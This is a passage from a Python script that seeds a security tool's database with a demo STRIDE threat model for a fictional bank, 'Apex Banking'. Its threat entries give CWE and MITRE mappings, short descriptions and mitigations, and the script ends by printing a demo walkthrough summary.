        {"id": "threat_7", "component": "Admin Portal", "component_id": "comp_11", "component_type": "process", "component_category": "frontend", "category": "Repudiation", "threat": "Missing Audit Trail for Admin Actions", "severity": "high", "risk_score": 7.0, "cwe": "CWE-778", "cwe_id": "CWE-778", "mitre": ["T1070"], "mitre_techniques": ["T1070"], "likelihood": "medium", "impact": "high", "description": "Admin actions (role changes, account freezes, limit overrides) not logged. Violates SOX compliance requirements.", "mitigation": "Log all admin actions to immutable audit trail with who, what, when, where, before/after values.", "review_status": "open", "references": {"cwe": "https://cwe.mitre.org/data/definitions/778.html"}},
        {"id": "threat_8", "component": "Payment Engine", "component_id": "comp_3", "component_type": "process", "component_category": "backend", "category": "Repudiation", "threat": "Incomplete Wire Transfer Approval Audit", "severity": "medium", "risk_score": 6.0, "cwe": "CWE-778", "cwe_id": "CWE-778", "mitre": ["T1070"], "mitre_techniques": ["T1070"], "likelihood": "low", "impact": "high", "description": "Wire transfer dual-approval actions not fully logged, preventing forensic reconstruction of approval chain.", "mitigation": "Log all approval/rejection actions with timestamp, IP, user identity, and transaction details.", "review_status": "open", "references": {"cwe": "https://cwe.mitre.org/data/definitions/778.html"}},
    ],
    "Information Disclosure": [
        {"id": "threat_9", "component": "Payment Engine", "component_id": "comp_3", "component_type": "process", "component_category": "backend", "category": "Information Disclosure", "threat": "PII Leakage via Application Logs", "severity": "high", "risk_score": 7.5, "cwe": "CWE-532", "cwe_id": "CWE-532", "mitre": ["T1005"], "mitre_techniques": ["T1005"], "likelihood": "high", "impact": "high", "description": "Customer SSN, account numbers, and email addresses logged at DEBUG level. PII exposed to all operations staff via Splunk.", "mitigation": "Never log PII. Implement PII redaction filter. Use structured logging with data classification.", "review_status": "open", "references": {"cwe": "https://cwe.mitre.org/data/definitions/532.html"}},
        {"id": "threat_10", "component": "Mobile Banking API Gateway", "component_id": "comp_1", "component_type": "process", "component_category": "api_gateway", "category": "Information Disclosure", "threat": "IDOR in Account Balance API", "severity": "high", "risk_score": 8.0, "cwe": "CWE-639", "cwe_id": "CWE-639", "mitre": ["T1530"], "mitre_techniques": ["T1530"], "likelihood": "high", "impact": "high", "description": "Account balance endpoint uses sequential account IDs without ownership verification. Any user can access any account balance.", "mitigation": "Implement ownership verification. Compare authenticated user's accounts with requested accountId.", "review_status": "open", "references": {"cwe": "https://cwe.mitre.org/data/definitions/639.html"}},
        {"id": "threat_11", "component": "Web Banking Portal", "component_id": "comp_0", "component_type": "process", "component_category": "frontend", "category": "Information Disclosure", "threat": "Verbose Error Messages Exposing Stack Traces", "severity": "medium", "risk_score": 5.0, "cwe": "CWE-209", "cwe_id": "CWE-209", "mitre": ["T1592"], "mitre_techniques": ["T1592"], "likelihood": "medium", "impact": "medium", "description": "API returns full Java stack traces revealing internal class names, database schema, and SQL queries.", "mitigation": "Return generic error messages. Log full details server-side with correlation IDs.", "review_status": "open", "references": {"cwe": "https://cwe.mitre.org/data/definitions/209.html"}},
    ],
    "Denial of Service": [
        {"id": "threat_12", "component": "Mobile Banking API Gateway", "component_id": "comp_1", "component_type": "process", "component_category": "api_gateway", "category": "Denial of Service", "threat": "API Rate Limiting Bypass", "severity": "medium", "risk_score": 6.0, "cwe": "CWE-770", "cwe_id": "CWE-770", "mitre": ["T1499"], "mitre_techniques": ["T1499"], "likelihood": "medium", "impact": "high", "description": "Absence of rate limiting on critical APIs allows flooding wire transfer and login endpoints.", "mitigation": "Implement per-user and per-IP rate limiting. Add circuit breaker for downstream services.", "review_status": "open", "references": {"cwe": "https://cwe.mitre.org/data/definitions/770.html"}},
        {"id": "threat_13", "component": "Kafka Event Bus", "component_id": "comp_7", "component_type": "process", "component_category": "messaging", "category": "Denial of Service", "threat": "Event Bus Flooding via Malicious Transactions", "severity": "medium", "risk_score": 5.5, "cwe": "CWE-400", "cwe_id": "CWE-400", "mitre": ["T1499"], "mitre_techniques": ["T1499"], "likelihood": "low", "impact": "high", "description": "Flood of fraudulent transaction events overwhelms Kafka consumers, delaying legitimate transaction processing.", "mitigation": "Implement backpressure handling. Add message validation at producer. Configure consumer group scaling.", "review_status": "open", "references": {"cwe": "https://cwe.mitre.org/data/definitions/400.html"}},
    ],
    "Elevation of Privilege": [
        {"id": "threat_14", "component": "Compliance Engine", "component_id": "comp_8", "component_type": "process", "component_category": "backend", "category": "Elevation of Privilege", "threat": "OFAC Sanctions Screening Bypass", "severity": "critical", "risk_score": 9.2, "cwe": "CWE-862", "cwe_id": "CWE-862", "mitre": ["T1548"], "mitre_techniques": ["T1548"], "likelihood": "medium", "impact": "critical", "description": "Wire transfers under $3,000 skip OFAC/SDN sanctions screening due to flawed threshold logic. Violates BSA/AML regulations.", "mitigation": "Screen ALL transfers regardless of amount. Remove amount threshold from sanctions check.", "review_status": "open", "references": {"cwe": "https://cwe.mitre.org/data/definitions/862.html"}},
        {"id": "threat_15", "component": "Admin Portal", "component_id": "comp_11", "component_type": "process", "component_category": "frontend", "category": "Elevation of Privilege", "threat": "Dual-Approval Bypass via Role Manipulation", "severity": "critical", "risk_score": 8.5, "cwe": "CWE-269", "cwe_id": "CWE-269", "mitre": ["T1078"], "mitre_techniques": ["T1078"], "likelihood": "low", "impact": "critical", "description": "Compromised approver can self-approve wire transfers, bypassing dual-control requirement.", "mitigation": "Enforce separation of duties: initiator cannot be approver. Validate role at both steps.", "review_status": "open", "references": {"cwe": "https://cwe.mitre.org/data/definitions/269.html"}},
        {"id": "threat_16", "component": "KYC Document Store", "component_id": "comp_10", "component_type": "datastore", "component_category": "storage", "category": "Elevation of Privilege", "threat": "Unrestricted File Upload leading to RCE", "severity": "critical", "risk_score": 9.0, "cwe": "CWE-434", "cwe_id": "CWE-434", "mitre": ["T1105"], "mitre_techniques": ["T1105"], "likelihood": "medium", "impact": "critical", "description": "KYC document upload accepts any file type. Attacker uploads malicious files that execute server-side.", "mitigation": "Validate file types against allowlist (PDF, JPG, PNG). Sanitize filenames. Store outside webroot.", "review_status": "open", "references": {"cwe": "https://cwe.mitre.org/data/definitions/434.html"}},
    ],
}

total_threats = sum(len(v) for v in stride_threats.values())

c.execute("""
    INSERT INTO threat_models (project_id, name, dfd_level, dfd_data, stride_analysis, trust_boundaries, data_flows, assets, threat_count, created_at, updated_at)
    VALUES (?, ?, 1, ?, ?, ?, ?, ?, ?, ?, ?)
""", (
    PROJECT_ID,
    "Apex Banking Threat Model",
    json.dumps({"level": 1, "nodes": dfd_nodes, "edges": dfd_edges, "trust_boundaries": dfd_trust_boundaries}),
    json.dumps(stride_threats),
    json.dumps(dfd_trust_boundaries),
    json.dumps(dfd_edges),
    json.dumps([
        {"id": "asset_0", "name": "Customer PII", "type": "data", "classification": "critical", "description": "Names, SSN, addresses, phone numbers"},
        {"id": "asset_1", "name": "Financial Transactions", "type": "data", "classification": "critical", "description": "Account balances, wire transfers, payment history"},
        {"id": "asset_2", "name": "Authentication Credentials", "type": "data", "classification": "critical", "description": "Passwords, JWT tokens, MFA seeds, session data"},
        {"id": "asset_3", "name": "SWIFT Credentials", "type": "data", "classification": "critical", "description": "SWIFT operator credentials and Alliance Gateway certificates"},
        {"id": "asset_4", "name": "KYC Documents", "type": "data", "classification": "sensitive", "description": "Passport scans, driver's license, proof of address"},
        {"id": "asset_5", "name": "Encryption Keys", "type": "data", "classification": "critical", "description": "AES-256 keys for data at rest, TLS certificates"},
    ]),
    total_threats,
    NOW, NOW,
))

print(f"   → Threat model created with {total_threats} threats across 6 STRIDE categories")

# ============================================================
# COMMIT
# ============================================================
conn.commit()
conn.close()

print(f"""
{'='*60}
  APEX BANKING DEMO DATA — COMPLETE
{'='*60}
  Project ID:     {PROJECT_ID}
  User Stories:   {len(story_ids)} (APEX-101 to APEX-108, JIRA source)
  SAST Findings:  {len(sast_findings)} (6 critical, 14 high, 18 medium, 7 low, 2 info)
  SCA Findings:   {len(sca_findings)} (3 critical, 7 high, 6 medium, 2 low)
  Secret Findings:{len(secret_findings)} (4 critical, 5 high, 2 medium, 1 low)
  Controls:       {len(controls_data)} (mapped to STRIDE categories)
  Threat Intel:   {len(intel_entries)} entries (FS-ISAC, CISA, FinCEN sources)
  Analyses:       {len(story_ids)} (detailed for APEX-101 & APEX-102)
{'='*60}
  Demo Flow:
  1. Dashboard → Apex Banking project shows risk score 72
  2. Stories → 8 JIRA stories with security analyses
  3. Threat Model → Generate for full STRIDE analysis
  4. SAST → 47 findings including SQLi in wire transfers
  5. SCA → 18 vulnerable deps (Log4Shell, Spring4Shell)
  6. Secrets → 12 leaked credentials (AWS keys, DB passwords)
  7. Controls → 15 controls with implementation status
  8. Threat Intel → 8 banking-specific intel entries
{'='*60}
""")
